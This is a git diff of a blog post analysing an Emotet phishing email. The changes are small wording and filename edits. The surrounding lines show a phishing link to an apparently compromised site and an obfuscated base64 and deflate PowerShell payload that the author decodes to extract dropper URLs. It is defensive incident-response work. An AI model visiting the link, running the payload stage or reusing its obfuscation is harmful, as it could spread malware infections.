@@ -6,7 +6,7 @@ date:   2019-03-13 14:49:33 +0000
 tags: [Malware, Incident Response, Emotet]
 ---
 
-![suspicious word doc](/blog/assets/Malware.png)
+![suspicious word doc](/blog/assets/malware.png)
 
 As our analysis begins on the phishing email we additionally have a suspicious Link.
  * http://hillhousewriters.com/_notes/ti8c-u5jpix-zgipgrvz/?emailId=aaa.bbb@xxxxx.com
@@ -127,7 +127,7 @@ After base-64 decoding becomes
 |fOREACH-oBjECT{NEW-objeCt SYSteM.iO.StrEamreADEr($_, [sySTeM.texT.ENCoDinG]::AsciI ) } 
 |foREaCh-objeCT{$_.readTOEND()}) 
 ```
-Cyberchef had some trouble with decompression - so WIndows poerwshell to the rescue
+Cyberchef had some trouble with de-compression - so Windows Powershell to the rescue, by a few simple code edits, we can safely run this code to extract the dropper URLs:
 ```
 $a=(NEW-objeCt  sYSTEm.iO.CoMpREssiON.DEfLATestReAm([syStEm.Io.MEmoRySTrEaM][sYstem.cOnvERt]::fRoMBaSe64STrinG( ('VZH'+'h'+'a'+'9s'+'wEMX/F'+'X8'+'wKCGLXYNhS42hp4pm2VhHGGY'+'QBkG'+'W'+'z7Fm'+'RzKy'+'Equ'+'E/O9Vtibd7u'+'P'+'d'+'j/'+'ce7'+'8IK'+'/DDICX/UlAF1'+'JAv'+'Nh'+'gF'+'scoXjX'+'Je'+'/Udj'+'gGW30E8vHTqKy'+'Wf'+'hE'+'l6xYs'+'zQ'+'njbX9f'+'RxLVTVG'+'7o'+'w+9JHQ+3'+'js50'+'Ir6+H40HeaV0NMi/j'+'hQ'+'g8'+'e77hoZf1yRXm1lyp+'+'X'+'vwFLnd'+'t5BDx7l'+'+d8t'+'PC'+'3'+'oB'+'almh0b6'+'Ww'+'O'+'F'+'jj77wbIoX'+'2Xa'+'4e'+'3v'+'1'+'qqbg'+'S'+'kneV'+'HIQ+'+'m'+'AH/'+'WO9'+'Uk5TiGI'+'98'+'+TEm0Y'+'++k3Z'+'CHsg0'+'C4tlwU'+'Dk5LtLU2C+'+'E18JTWEM8'+'oC'+'kizu'+'/+Ax'+'JC5Cscy'+'Kd'+'gNRdoK/bxK/yEN'+'X'+'x/jC'+'g6Y'+'2uZYc'+'z8o'+'v'+'MrgozEqFDkt'+'XaIB'+'f'+'NJB'+'zbrQMI'+'pApu'+'vU5P1'+'ryc3'+'v4'+'QMT2qS4dPXuq'+'KfwjezHzWLwVQCsw'+'n'+'YRu2hmLpf7i'+'qg8lkiX'+'a+s'+'ri/sVGHame'+'bYL7DIL'+'3z'+'Mw1OK3XULf7HZSFtabstXJ'+'KTCgqAt'+'NiQ'+'rPR52+x8F'+'tyK5'+'nQ+h'+'9+o0'+'9TBm'+'JPR+aC+g'+'Fc=') ) ,[Io.ComPReSSION.COMPRESsioNMoDE]::DecoMpReSS ) |fOREACH-oBjECT{NEW-objeCt SYSteM.iO.StrEamreADEr($_, [sySTeM.texT.ENCoDinG]::AsciI ) } |foREaCh-objeCT{$_.readTOEND()}) 
 $a
